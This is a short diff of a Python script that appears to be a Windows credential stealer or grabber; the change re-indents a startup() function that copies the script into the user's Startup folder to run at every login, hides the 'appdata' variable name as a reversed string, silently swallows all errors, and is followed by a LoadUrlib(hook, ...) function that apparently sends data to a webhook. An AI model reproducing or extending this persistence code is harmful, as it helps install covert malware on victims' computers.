@@ -317,27 +317,29 @@ def add_to_startup(new_path):
 
 
 def startup():
-    global StartupMessage
-    StartupMessage = 'Sucessfully added to startup'
     try:
-
-        new_path = create_copy_and_return_new_path()
-        new_path = check_python_or_convert(new_path)
+        global StartupMessage
+        StartupMessage = 'Sucessfully added to startup'
         try:
-            add_to_startup(new_path)
-        except Exception as e:
+    
+            new_path = create_copy_and_return_new_path()
+            new_path = check_python_or_convert(new_path)
+            try:
+                add_to_startup(new_path)
+            except Exception as e:
+                pass
+        except:
             pass
-    except:
-        pass
-    apppp = 'atadppa'
-    path = check_python_or_convert(path)
-    if not isfile(path):
-        path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-        copy(__file__, path)
-
-    else:
-        if __file__.replace('\\', '/') != path.replace('\\', '/'):
-            pass
+        apppp = 'atadppa'
+        path = check_python_or_convert(path)
+        if not isfile(path):
+            path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+            copy(__file__, path)
+    
+        else:
+            if __file__.replace('\\', '/') != path.replace('\\', '/'):
+                pass
+    except:pass
 
 def LoadUrlib(hook, data='', files='', headers=''):
     
